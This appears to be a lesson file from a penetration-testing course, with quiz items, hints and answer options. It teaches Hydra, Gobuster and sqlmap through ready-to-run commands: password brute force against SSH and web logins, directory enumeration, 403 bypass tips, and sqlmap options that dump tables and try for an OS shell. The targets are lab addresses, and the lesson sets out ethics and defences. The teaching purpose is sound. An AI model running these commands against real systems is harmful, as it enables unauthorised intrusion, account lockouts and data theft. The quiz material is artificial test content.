title: Essential offensive tools
description: Hydra for credentials, Gobuster for directories, sqlmap for SQL injection.

1.title: Hydra: credential brute force
1.body:
## The credential hammer

Hydra launches login attempts against services (SSH, FTP, HTTP forms, RDP…), trying
dictionary combinations:

```bash
# SSH with a fixed user and a password dictionary
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 ssh

# Web form (note the http-post-form module: login=^USER^&pass=^PASS^:F=incorrecto)
hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form \
  "/login:user=^USER^&password=^PASS^:Login incorrecto"
```

- `-l` single user / `-L` file of users
- `-p` single password / `-P` file of passwords
- `^USER^`/`^PASS^` are replaced on every attempt; `:F=mensaje` detects the failure

## When it works (and when it doesn't)

It works against: dictionary passwords, services with no limit on attempts.
It fails against: account lockout, 2FA, rate limiting, long random passwords.
As a defender: lockout + rate limit + 2FA kills Hydra.

**Ethics**: brute force ONLY in labs. Against third parties it is illegal, and it also
locks out real users' accounts.

herramientas-ofensivas-t01-q01.prompt: What type of attack does Hydra carry out?
herramientas-ofensivas-t01-q01.hint: Trying many passwords/usernames against a login service.

options.b: Dictionary (or brute-force) attack against authentication services

herramientas-ofensivas-t01-q02.prompt: In 'hydra -l admin -P rockyou.txt ssh://10.10.10.5', what does -P (uppercase) mean?

2.title: Gobuster: uncovering what is hidden
2.body:
## Looking over ffuf's shoulder

You already know ffuf (web module). **Gobuster** is the classic alternative, with its own
syntax:

```bash
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt
# useful flags: -x php,html,txt (extensions) -t 50 (threads) -s 200,301,302,403
```

- **dir**: brute-forces paths (`/admin`, `/backup.zip`…)
- **dns**: brute-forces subdomains (`gobuster dns -d victima.com -w subdominios.txt`)
- **vhost**: brute-forces virtual hosts

## Reading the results

| Code | What it means for you |
|---|---|
| 200 | exists and is accessible |
| 301/302 | redirect (follow it with -u and a trailing slash) |
| **403** | it EXISTS but it's forbidden! — a bypass target |
| 404 | doesn't exist |

A 403 deserves attention: sometimes you can bypass it by changing headers (`X-Forwarded-For`),
trying uppercase letters or appending `/.` after the path. Those techniques are practiced in the
Jr Pentester path.

## Operational hygiene

Fuzzing generates a LOT of noise in the logs — a defender spots it in seconds. In real
engagements the time window and the request rate are agreed with the client. In labs: go for it.

herramientas-ofensivas-t02-q01.prompt: Which Gobuster mode brute-forces web directories and files?
herramientas-ofensivas-t02-q01.hint: It's the default mode: gobuster dir.

3.title: sqlmap: automated SQL injection
3.body:
## From a 500 error to the entire database

You already know how to detect SQLi by hand (`' OR 1=1--`). **sqlmap** automates the full
exploitation: it enumerates databases, tables and columns, and dumps the data.

```bash
# Vulnerable parameter in the URL (note the trailing quote of the id=1 parameter)
sqlmap -u "http://10.10.10.5/producto?id=1" --batch

# Progressive steps
sqlmap -u URL --dbs                 # list databases
sqlmap -u URL -D tienda --tables    # tables of a database
sqlmap -u URL -D tienda -T users --dump   # data!
sqlmap -u URL --os-shell            # try to get an OS shell (maximum damage)
```

With `--batch` it answers its prompts with the defaults (useful in labs).

## Order matters

In a real pentest: (1) you find the injection point BY HAND with Burp, (2) you understand
which parameter and which context, (3) ONLY then do you automate. Running sqlmap blindly against
a whole website generates noise, can take the app down, and makes you miss findings that manual
reasoning uncovers.

SQL injection is explained in depth in the OWASP Top 10 module and in the Jr
Pentester path — with dedicated labs. Here you take away the map: unvalidated input
→ manipulated query → compromised database.

herramientas-ofensivas-t03-q01.prompt: Which sqlmap option dumps the data of a specific table?

herramientas-ofensivas-t03-q02.prompt: Which sqlmap flag tries to get an operating system shell (--os-...)?

herramientas-ofensivas-t03-q03.prompt: Before automating SQLi with sqlmap, what should you ALWAYS do?
herramientas-ofensivas-t03-q03.hint: Understand the vulnerable parameter manually first.

options.a: Nothing: sqlmap finds everything on its own
options.b: Confirm the injection by hand (quote, error) and pin down the parameter

4.title: Lab: brute force with hydra
4.body:
## Practice: hydra against a real login

```bash
# Verify directly (if you know the password):
curl "http://127.0.0.1:18090/login?username=admin&password=summer2014"

# With hydra (GET form):
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 18090 \
  http-get-form "/login:username=^USER^&password=^PASS^:incorrect"

# With ffuf:
ffuf -w rockyou.txt -u "http://127.0.0.1:18090/login?username=admin&password=FUZZ" -fc 401
```

The passwords in this lab are in the top 100 of rockyou.txt. That's the lesson:
if your password is in a dictionary, a brute-force attack finds it
in seconds.
